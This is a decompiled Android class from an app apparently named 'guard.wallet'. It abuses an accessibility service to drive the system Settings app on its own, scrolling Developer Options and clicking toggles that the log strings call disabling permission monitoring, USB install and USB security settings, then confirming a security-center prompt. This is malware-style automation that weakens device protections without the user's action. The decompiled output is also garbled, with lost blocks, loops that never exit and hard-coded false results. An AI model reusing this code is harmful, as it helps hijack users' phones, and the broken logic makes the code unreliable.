package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;
import p000a.AbstractC0000a;
import p002e.RunnableC0261a;
import p005h.C0318e;
import p022z.C0981d;

/* renamed from: o.k */
/* loaded from: classes.dex */
public final class C0422k extends C0416e {

    /* renamed from: n */
    public final ScheduledExecutorService f922n;

    /* renamed from: o */
    public final ConcurrentLinkedQueue f923o;

    /* renamed from: p */
    public boolean f924p;

    /* renamed from: q */
    public boolean f925q;

    /* renamed from: r */
    public boolean f926r;

    /* renamed from: s */
    public final ReentrantLock f927s;

    /* renamed from: t */
    public final AtomicBoolean f928t;

    public C0422k() {
        super(m1125J(), "com.android.settings");
        ScheduledExecutorService newSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
        this.f922n = newSingleThreadScheduledExecutor;
        this.f923o = new ConcurrentLinkedQueue();
        this.f924p = false;
        this.f925q = false;
        this.f926r = false;
        this.f927s = new ReentrantLock();
        this.f928t = new AtomicBoolean(false);
        try {
            newSingleThreadScheduledExecutor.schedule(new RunnableC0261a(this, 2), 100L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("EnableSecureDelegate", e2);
        }
    }

    /* renamed from: J */
    public static LinkedList m1125J() {
        LinkedList linkedList = new LinkedList();
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
        AbstractC0413b.m1024r(listenWindow).add(32);
        listenWindow.getEventTypes().add(16384);
        linkedList.add(listenWindow);
        ListenWindow listenWindow2 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
        listenWindow2.setEventTypes(new HashSet<>());
        listenWindow2.getEventTypes().add(32);
        listenWindow2.getEventTypes().add(16384);
        linkedList.add(listenWindow2);
        linkedList.add(a0.s0());
        linkedList.add(a0.p0());
        linkedList.add(a0.o0());
        ListenWindow listenWindow3 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        listenWindow3.setEventTypes(new HashSet<>());
        listenWindow3.getEventTypes().add(32);
        listenWindow3.getEventTypes().add(16384);
        linkedList.add(listenWindow3);
        linkedList.add(a0.M0());
        linkedList.add(a0.I0());
        return linkedList;
    }

    /* renamed from: H */
    public final boolean m1126H() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(a0.M0());
        return m1078q(linkedList);
    }

    /* renamed from: I */
    public final void m1127I(boolean z2) {
        ReentrantLock reentrantLock = this.f927s;
        if (reentrantLock.tryLock()) {
            AtomicBoolean atomicBoolean = this.f928t;
            try {
                if (!atomicBoolean.get()) {
                    Log.d("EnableSecureDelegate", "准备结束安全设置自动化引擎");
                    atomicBoolean.set(true);
                    this.f922n.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f923o.clear();
                    try {
                        AbstractC0251g.F0(1);
                        AbstractC0251g.T0(5);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("EnableSecureDelegate", e2);
                    }
                    if (C0318e.m844S() != null) {
                        Log.d("EnableSecureDelegate", "enableInFinish finishOpenWriteSecure");
                        C0318e.m844S().m859R(z2);
                    } else if (MyAccessibilityService.m554P() != null) {
                        Log.d("EnableSecureDelegate", "enableInFinish removeEnableSecureDelegate");
                        MyAccessibilityService.m554P().m541v();
                    }
                    AbstractC0184g.m349c();
                    Log.d("EnableSecureDelegate", "已结束安全设置自动化引擎");
                    super.mo1001d();
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("EnableSecureDelegate", e3);
            }
            reentrantLock.unlock();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:10:0x003d, code lost:
    
        if (r1 != false) goto L14;
     */
    /* JADX WARN: Code restructure failed: missing block: B:11:0x003f, code lost:
    
        r4.click();
        r2.setClicked(true);
     */
    /* JADX WARN: Code restructure failed: missing block: B:12:0x0046, code lost:
    
        if (r9 <= 0) goto L14;
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x0048, code lost:
    
        com.guard.wallet.utils.AbstractC0251g.T0(r9);
        r4.refresh();
        r1 = r4.checked();
     */
    /* JADX WARN: Code restructure failed: missing block: B:9:0x0039, code lost:
    
        r1 = r4.checked();
     */
    /* renamed from: K */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final CheckedResult m1128K(UiObject uiObject, int i2) {
        boolean z2 = false;
        AtomicInteger atomicInteger = new AtomicInteger(0);
        CheckedResult checkedResult = new CheckedResult();
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.getStringConditions().add(AbstractC0000a.m7c(combineFilter, "className", "android.widget.CheckBox"));
        MyAccessibilityService.m548I(uiObject);
        UiObject uiObject2 = null;
        while (uiObject != null && uiObject2 == null && atomicInteger.incrementAndGet() <= 3) {
            uiObject2 = uiObject.findOneByCombine(combineFilter);
            uiObject = uiObject.parent();
        }
        checkedResult.setChecked(z2);
        return checkedResult;
    }

    /* renamed from: L */
    public final UiObject m1129L() {
        CombineFiltersWithOr H0 = a0.H0();
        if (m1072k() != null) {
            return m1072k().findOneByOperateOr(H0);
        }
        return null;
    }

    @Override // p012o.C0416e
    /* renamed from: d */
    public final void mo1001d() {
        try {
            this.f922n.shutdownNow();
            AbstractC0243l.m591a(this.f864c);
            this.f923o.clear();
            super.mo1001d();
        } catch (Exception e2) {
            AbstractC0026q.m186s("EnableSecureDelegate", e2);
        }
    }

    @Override // p012o.C0416e
    public final boolean equals(Object obj) {
        return obj instanceof C0422k;
    }

    @Override // p012o.C0416e
    public final int hashCode() {
        return Objects.hash(C0422k.class.getName());
    }

    @Override // p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        if (this.f928t.get()) {
            return;
        }
        if (accessibilityEvent != null) {
            super.mo1002u(accessibilityEvent, str, str2);
        }
        LinkedList linkedList = new LinkedList();
        linkedList.add(a0.m992Y());
        linkedList.add(a0.m990W());
        linkedList.add(a0.s0());
        linkedList.add(a0.P0());
        linkedList.add(a0.O0());
        linkedList.add(a0.p0());
        linkedList.add(a0.o0());
        boolean m1078q = m1078q(linkedList);
        String str3 = this.f864c;
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f923o;
        if (m1078q && !concurrentLinkedQueue.contains("enableInPrepareFinish")) {
            concurrentLinkedQueue.add("enableInPrepareFinish");
            final int i2 = 0;
            AbstractC0243l.m593c(new Runnable(this) { // from class: o.j

                /* renamed from: b */
                public final /* synthetic */ C0422k f914b;

                {
                    this.f914b = this;
                }

                /* JADX WARN: Code restructure failed: missing block: B:143:0x0248, code lost:
                
                    if (r6.f926r != false) goto L134;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:33:0x00a3, code lost:
                
                    r9 = r10.checked();
                 */
                /* JADX WARN: Code restructure failed: missing block: B:34:0x00a7, code lost:
                
                    if (r9 != false) goto L44;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:36:0x00ad, code lost:
                
                    if (r10.click() == false) goto L44;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:37:0x00af, code lost:
                
                    r12.setClicked(true);
                    r10.refresh();
                    r9 = r10.checked();
                    r11 = 20;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:38:0x00ba, code lost:
                
                    if (r11 <= 0) goto L166;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:39:0x00bc, code lost:
                
                    if (r9 != false) goto L167;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:40:0x00be, code lost:
                
                    com.guard.wallet.utils.AbstractC0251g.T0(1);
                    r10.refresh();
                    r9 = r10.checked();
                    r11 = r11 - 1;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:42:0x00cc, code lost:
                
                    if (r9 != false) goto L55;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:43:0x00ce, code lost:
                
                    r13 = r10.findParentUtilCombine(p012o.a0.m987T());
                 */
                /* JADX WARN: Code restructure failed: missing block: B:44:0x00d6, code lost:
                
                    if (r13 == null) goto L55;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:46:0x00dc, code lost:
                
                    if (r13.click() == false) goto L55;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:47:0x00de, code lost:
                
                    r12.setClicked(true);
                    r10.refresh();
                    r9 = r10.checked();
                 */
                /* JADX WARN: Code restructure failed: missing block: B:48:0x00e8, code lost:
                
                    if (r11 <= 0) goto L168;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:49:0x00ea, code lost:
                
                    if (r9 != false) goto L169;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:50:0x00ec, code lost:
                
                    com.guard.wallet.utils.AbstractC0251g.T0(1);
                    r10.refresh();
                    r9 = r10.checked();
                    r11 = r11 - 1;
                 */
                /* JADX WARN: Code restructure failed: missing block: B:57:0x00cb, code lost:
                
                    r11 = 20;
                 */
                @Override // java.lang.Runnable
                /*
                    Code decompiled incorrectly, please refer to instructions dump.
                */
                public final void run() {
                    boolean m1126H;
                    boolean z2;
                    boolean m1126H2;
                    UiObject findParentUtilCombine;
                    boolean z3;
                    UiObject findParentUtilCombine2;
                    UiObject uiObject;
                    int i3 = i2;
                    boolean z4 = true;
                    int i4 = 10;
                    C0422k c0422k = this.f914b;
                    switch (i3) {
                        case 0:
                            c0422k.getClass();
                            if (a0.t0()) {
                                if (AbstractC0249e.m620i()) {
                                    AtomicInteger atomicInteger = new AtomicInteger(0);
                                    while (true) {
                                        UiObject m1129L = c0422k.m1129L();
                                        if (m1129L != null && m1129L.canScrollForward()) {
                                            m1129L.scrollForwardEnd();
                                            c0422k.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                            AbstractC0251g.T0(5);
                                            m1129L = c0422k.m1129L();
                                        }
                                        UiObject uiObject2 = null;
                                        if (m1129L != null) {
                                            uiObject = m1129L.canScrollBackward() ? m1129L.scrollBackwardUtil(a0.F0()) : null;
                                            if (uiObject == null && m1129L.canScrollForward()) {
                                                uiObject = m1129L.scrollForwardUtil(a0.F0());
                                            }
                                        } else {
                                            uiObject = null;
                                        }
                                        if (uiObject != null && uiObject.parent() != null) {
                                            UiObject parent = uiObject.parent();
                                            AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                            CheckedResult checkedResult = new CheckedResult();
                                            CombineFilter Q0 = a0.Q0();
                                            MyAccessibilityService.m548I(parent);
                                            while (parent != null && uiObject2 == null && atomicInteger2.incrementAndGet() <= 3) {
                                                uiObject2 = parent.findOneByCombine(Q0);
                                                parent = parent.parent();
                                            }
                                            boolean z5 = false;
                                            checkedResult.setChecked(z5);
                                            if (checkedResult.isChecked()) {
                                                c0422k.f924p = true;
                                                Log.d("EnableSecureDelegate", "禁用权限监控已勾选");
                                            }
                                        }
                                        if (!c0422k.f924p && atomicInteger.incrementAndGet() <= 10) {
                                            AbstractC0251g.T0(10);
                                        }
                                    }
                                    c0422k.m1127I(c0422k.f924p);
                                }
                                if (AbstractC0249e.m624m()) {
                                    AtomicInteger atomicInteger3 = new AtomicInteger(0);
                                    while (true) {
                                        UiObject m1129L2 = c0422k.m1129L();
                                        if (m1129L2 != null) {
                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                            UiObject scrollForwardUtil = m1129L2.scrollForwardUtil(c0981d);
                                            if (scrollForwardUtil == null) {
                                                m1129L2.scrollBackwardEnd();
                                                c0422k.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                AbstractC0251g.T0(5);
                                                UiObject m1129L3 = c0422k.m1129L();
                                                if (m1129L3 != null) {
                                                    scrollForwardUtil = m1129L3.scrollForwardUtil(c0981d);
                                                }
                                            }
                                            if (scrollForwardUtil == null || (findParentUtilCombine2 = scrollForwardUtil.findParentUtilCombine(a0.q0())) == null) {
                                                z3 = false;
                                            } else {
                                                CheckedResult m1128K = c0422k.m1128K(findParentUtilCombine2, 20);
                                                c0422k.f925q = m1128K.isChecked();
                                                z3 = m1128K.isClicked();
                                            }
                                            if (z3) {
                                                Log.d("EnableSecureDelegate", "USB安装已点击");
                                            }
                                            if (c0422k.f925q) {
                                                Log.d("EnableSecureDelegate", "USB安装已勾选");
                                            }
                                        }
                                        if (!c0422k.f925q && atomicInteger3.incrementAndGet() <= 10) {
                                            AbstractC0251g.T0(10);
                                        }
                                    }
                                    atomicInteger3.set(0);
                                    while (true) {
                                        UiObject m1129L4 = c0422k.m1129L();
                                        if (m1129L4 != null) {
                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                            UiObject scrollForwardUtil2 = m1129L4.scrollForwardUtil(c0981d2);
                                            if (scrollForwardUtil2 == null) {
                                                m1129L4.scrollBackwardEnd();
                                                c0422k.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                AbstractC0251g.T0(5);
                                                UiObject m1129L5 = c0422k.m1129L();
                                                if (m1129L5 != null) {
                                                    scrollForwardUtil2 = m1129L5.scrollForwardUtil(c0981d2);
                                                }
                                            }
                                            if (scrollForwardUtil2 == null || (findParentUtilCombine = scrollForwardUtil2.findParentUtilCombine(a0.q0())) == null) {
                                                z2 = false;
                                            } else {
                                                AbstractC0251g.T0(5);
                                                CheckedResult m1128K2 = c0422k.m1128K(findParentUtilCombine, 0);
                                                c0422k.f926r = m1128K2.isChecked();
                                                z2 = m1128K2.isClicked();
                                            }
                                            if (c0422k.f926r) {
                                                Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                            }
                                            if (z2) {
                                                AtomicInteger atomicInteger4 = new AtomicInteger(10);
                                                while (true) {
                                                    m1126H2 = c0422k.m1126H();
                                                    if (!m1126H2 && atomicInteger4.decrementAndGet() >= 0) {
                                                        AbstractC0251g.T0(1);
                                                    }
                                                }
                                                if (m1126H2) {
                                                    Log.d("EnableSecureDelegate", "USB安全设置点击成功,已弹出安全设置窗口");
                                                }
                                            }
                                        }
                                        AtomicInteger atomicInteger5 = new AtomicInteger(10);
                                        while (true) {
                                            m1126H = c0422k.m1126H();
                                            if (!m1126H && atomicInteger5.decrementAndGet() >= 0) {
                                                AbstractC0251g.T0(1);
                                            }
                                        }
                                        if (!c0422k.f926r && !m1126H && atomicInteger3.incrementAndGet() <= 10) {
                                            AbstractC0251g.T0(10);
                                        }
                                    }
                                    if (c0422k.f926r) {
                                        Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                        if (c0422k.f925q) {
                                            break;
                                        }
                                    }
                                }
                                c0422k.f923o.remove("enableInPrepareFinish");
                                break;
                            }
                            z4 = false;
                            c0422k.m1127I(z4);
                            c0422k.f923o.remove("enableInPrepareFinish");
                            break;
                        default:
                            c0422k.getClass();
                            Log.d("EnableSecureDelegate", "enableInSecurityCenter 窗口匹配");
                            UiObject findOneByCombine = c0422k.m1072k().findOneByCombine(a0.K0());
                            ConcurrentLinkedQueue concurrentLinkedQueue2 = c0422k.f923o;
                            if (findOneByCombine != null && findOneByCombine.clickable() && findOneByCombine.click()) {
                                Log.d("EnableSecureDelegate", "enableInSecurityCenter 下一步");
                            } else {
                                UiObject findOneByCombine2 = c0422k.m1072k().findOneByCombine(a0.J0());
                                if (findOneByCombine2 != null && findOneByCombine2.clickable() && findOneByCombine2.click()) {
                                    while (true) {
                                        AbstractC0251g.T0(i4);
                                        if ((c0422k.m1072k() == null || c0422k.m1072k().findOneByCombine(a0.L0()) == null) ? false : true) {
                                            Log.d("EnableSecureDelegate", "正在开启USB安全设置....");
                                            i4 = 5;
                                        } else {
                                            c0422k.f926r = true;
                                            c0422k.m1127I(c0422k.f925q);
                                        }
                                    }
                                }
                            }
                            concurrentLinkedQueue2.remove("enableInSecurityCenter");
                            break;
                    }
                }
            }, str3);
        }
        if (!m1126H() || concurrentLinkedQueue.contains("enableInSecurityCenter")) {
            return;
        }
        concurrentLinkedQueue.add("enableInSecurityCenter");
        final int i3 = 1;
        AbstractC0243l.m593c(new Runnable(this) { // from class: o.j

            /* renamed from: b */
            public final /* synthetic */ C0422k f914b;

            {
                this.f914b = this;
            }

            /* JADX WARN: Code restructure failed: missing block: B:143:0x0248, code lost:
            
                if (r6.f926r != false) goto L134;
             */
            /* JADX WARN: Code restructure failed: missing block: B:33:0x00a3, code lost:
            
                r9 = r10.checked();
             */
            /* JADX WARN: Code restructure failed: missing block: B:34:0x00a7, code lost:
            
                if (r9 != false) goto L44;
             */
            /* JADX WARN: Code restructure failed: missing block: B:36:0x00ad, code lost:
            
                if (r10.click() == false) goto L44;
             */
            /* JADX WARN: Code restructure failed: missing block: B:37:0x00af, code lost:
            
                r12.setClicked(true);
                r10.refresh();
                r9 = r10.checked();
                r11 = 20;
             */
            /* JADX WARN: Code restructure failed: missing block: B:38:0x00ba, code lost:
            
                if (r11 <= 0) goto L166;
             */
            /* JADX WARN: Code restructure failed: missing block: B:39:0x00bc, code lost:
            
                if (r9 != false) goto L167;
             */
            /* JADX WARN: Code restructure failed: missing block: B:40:0x00be, code lost:
            
                com.guard.wallet.utils.AbstractC0251g.T0(1);
                r10.refresh();
                r9 = r10.checked();
                r11 = r11 - 1;
             */
            /* JADX WARN: Code restructure failed: missing block: B:42:0x00cc, code lost:
            
                if (r9 != false) goto L55;
             */
            /* JADX WARN: Code restructure failed: missing block: B:43:0x00ce, code lost:
            
                r13 = r10.findParentUtilCombine(p012o.a0.m987T());
             */
            /* JADX WARN: Code restructure failed: missing block: B:44:0x00d6, code lost:
            
                if (r13 == null) goto L55;
             */
            /* JADX WARN: Code restructure failed: missing block: B:46:0x00dc, code lost:
            
                if (r13.click() == false) goto L55;
             */
            /* JADX WARN: Code restructure failed: missing block: B:47:0x00de, code lost:
            
                r12.setClicked(true);
                r10.refresh();
                r9 = r10.checked();
             */
            /* JADX WARN: Code restructure failed: missing block: B:48:0x00e8, code lost:
            
                if (r11 <= 0) goto L168;
             */
            /* JADX WARN: Code restructure failed: missing block: B:49:0x00ea, code lost:
            
                if (r9 != false) goto L169;
             */
            /* JADX WARN: Code restructure failed: missing block: B:50:0x00ec, code lost:
            
                com.guard.wallet.utils.AbstractC0251g.T0(1);
                r10.refresh();
                r9 = r10.checked();
                r11 = r11 - 1;
             */
            /* JADX WARN: Code restructure failed: missing block: B:57:0x00cb, code lost:
            
                r11 = 20;
             */
            @Override // java.lang.Runnable
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public final void run() {
                boolean m1126H;
                boolean z2;
                boolean m1126H2;
                UiObject findParentUtilCombine;
                boolean z3;
                UiObject findParentUtilCombine2;
                UiObject uiObject;
                int i32 = i3;
                boolean z4 = true;
                int i4 = 10;
                C0422k c0422k = this.f914b;
                switch (i32) {
                    case 0:
                        c0422k.getClass();
                        if (a0.t0()) {
                            if (AbstractC0249e.m620i()) {
                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                while (true) {
                                    UiObject m1129L = c0422k.m1129L();
                                    if (m1129L != null && m1129L.canScrollForward()) {
                                        m1129L.scrollForwardEnd();
                                        c0422k.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                        AbstractC0251g.T0(5);
                                        m1129L = c0422k.m1129L();
                                    }
                                    UiObject uiObject2 = null;
                                    if (m1129L != null) {
                                        uiObject = m1129L.canScrollBackward() ? m1129L.scrollBackwardUtil(a0.F0()) : null;
                                        if (uiObject == null && m1129L.canScrollForward()) {
                                            uiObject = m1129L.scrollForwardUtil(a0.F0());
                                        }
                                    } else {
                                        uiObject = null;
                                    }
                                    if (uiObject != null && uiObject.parent() != null) {
                                        UiObject parent = uiObject.parent();
                                        AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                        CheckedResult checkedResult = new CheckedResult();
                                        CombineFilter Q0 = a0.Q0();
                                        MyAccessibilityService.m548I(parent);
                                        while (parent != null && uiObject2 == null && atomicInteger2.incrementAndGet() <= 3) {
                                            uiObject2 = parent.findOneByCombine(Q0);
                                            parent = parent.parent();
                                        }
                                        boolean z5 = false;
                                        checkedResult.setChecked(z5);
                                        if (checkedResult.isChecked()) {
                                            c0422k.f924p = true;
                                            Log.d("EnableSecureDelegate", "禁用权限监控已勾选");
                                        }
                                    }
                                    if (!c0422k.f924p && atomicInteger.incrementAndGet() <= 10) {
                                        AbstractC0251g.T0(10);
                                    }
                                }
                                c0422k.m1127I(c0422k.f924p);
                            }
                            if (AbstractC0249e.m624m()) {
                                AtomicInteger atomicInteger3 = new AtomicInteger(0);
                                while (true) {
                                    UiObject m1129L2 = c0422k.m1129L();
                                    if (m1129L2 != null) {
                                        C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                        UiObject scrollForwardUtil = m1129L2.scrollForwardUtil(c0981d);
                                        if (scrollForwardUtil == null) {
                                            m1129L2.scrollBackwardEnd();
                                            c0422k.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                            AbstractC0251g.T0(5);
                                            UiObject m1129L3 = c0422k.m1129L();
                                            if (m1129L3 != null) {
                                                scrollForwardUtil = m1129L3.scrollForwardUtil(c0981d);
                                            }
                                        }
                                        if (scrollForwardUtil == null || (findParentUtilCombine2 = scrollForwardUtil.findParentUtilCombine(a0.q0())) == null) {
                                            z3 = false;
                                        } else {
                                            CheckedResult m1128K = c0422k.m1128K(findParentUtilCombine2, 20);
                                            c0422k.f925q = m1128K.isChecked();
                                            z3 = m1128K.isClicked();
                                        }
                                        if (z3) {
                                            Log.d("EnableSecureDelegate", "USB安装已点击");
                                        }
                                        if (c0422k.f925q) {
                                            Log.d("EnableSecureDelegate", "USB安装已勾选");
                                        }
                                    }
                                    if (!c0422k.f925q && atomicInteger3.incrementAndGet() <= 10) {
                                        AbstractC0251g.T0(10);
                                    }
                                }
                                atomicInteger3.set(0);
                                while (true) {
                                    UiObject m1129L4 = c0422k.m1129L();
                                    if (m1129L4 != null) {
                                        C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                        UiObject scrollForwardUtil2 = m1129L4.scrollForwardUtil(c0981d2);
                                        if (scrollForwardUtil2 == null) {
                                            m1129L4.scrollBackwardEnd();
                                            c0422k.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                            AbstractC0251g.T0(5);
                                            UiObject m1129L5 = c0422k.m1129L();
                                            if (m1129L5 != null) {
                                                scrollForwardUtil2 = m1129L5.scrollForwardUtil(c0981d2);
                                            }
                                        }
                                        if (scrollForwardUtil2 == null || (findParentUtilCombine = scrollForwardUtil2.findParentUtilCombine(a0.q0())) == null) {
                                            z2 = false;
                                        } else {
                                            AbstractC0251g.T0(5);
                                            CheckedResult m1128K2 = c0422k.m1128K(findParentUtilCombine, 0);
                                            c0422k.f926r = m1128K2.isChecked();
                                            z2 = m1128K2.isClicked();
                                        }
                                        if (c0422k.f926r) {
                                            Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                        }
                                        if (z2) {
                                            AtomicInteger atomicInteger4 = new AtomicInteger(10);
                                            while (true) {
                                                m1126H2 = c0422k.m1126H();
                                                if (!m1126H2 && atomicInteger4.decrementAndGet() >= 0) {
                                                    AbstractC0251g.T0(1);
                                                }
                                            }
                                            if (m1126H2) {
                                                Log.d("EnableSecureDelegate", "USB安全设置点击成功,已弹出安全设置窗口");
                                            }
                                        }
                                    }
                                    AtomicInteger atomicInteger5 = new AtomicInteger(10);
                                    while (true) {
                                        m1126H = c0422k.m1126H();
                                        if (!m1126H && atomicInteger5.decrementAndGet() >= 0) {
                                            AbstractC0251g.T0(1);
                                        }
                                    }
                                    if (!c0422k.f926r && !m1126H && atomicInteger3.incrementAndGet() <= 10) {
                                        AbstractC0251g.T0(10);
                                    }
                                }
                                if (c0422k.f926r) {
                                    Log.d("EnableSecureDelegate", "USB安全设置已勾选");
                                    if (c0422k.f925q) {
                                        break;
                                    }
                                }
                            }
                            c0422k.f923o.remove("enableInPrepareFinish");
                            break;
                        }
                        z4 = false;
                        c0422k.m1127I(z4);
                        c0422k.f923o.remove("enableInPrepareFinish");
                        break;
                    default:
                        c0422k.getClass();
                        Log.d("EnableSecureDelegate", "enableInSecurityCenter 窗口匹配");
                        UiObject findOneByCombine = c0422k.m1072k().findOneByCombine(a0.K0());
                        ConcurrentLinkedQueue concurrentLinkedQueue2 = c0422k.f923o;
                        if (findOneByCombine != null && findOneByCombine.clickable() && findOneByCombine.click()) {
                            Log.d("EnableSecureDelegate", "enableInSecurityCenter 下一步");
                        } else {
                            UiObject findOneByCombine2 = c0422k.m1072k().findOneByCombine(a0.J0());
                            if (findOneByCombine2 != null && findOneByCombine2.clickable() && findOneByCombine2.click()) {
                                while (true) {
                                    AbstractC0251g.T0(i4);
                                    if ((c0422k.m1072k() == null || c0422k.m1072k().findOneByCombine(a0.L0()) == null) ? false : true) {
                                        Log.d("EnableSecureDelegate", "正在开启USB安全设置....");
                                        i4 = 5;
                                    } else {
                                        c0422k.f926r = true;
                                        c0422k.m1127I(c0422k.f925q);
                                    }
                                }
                            }
                        }
                        concurrentLinkedQueue2.remove("enableInSecurityCenter");
                        break;
                }
            }
        }, str3);
    }
}
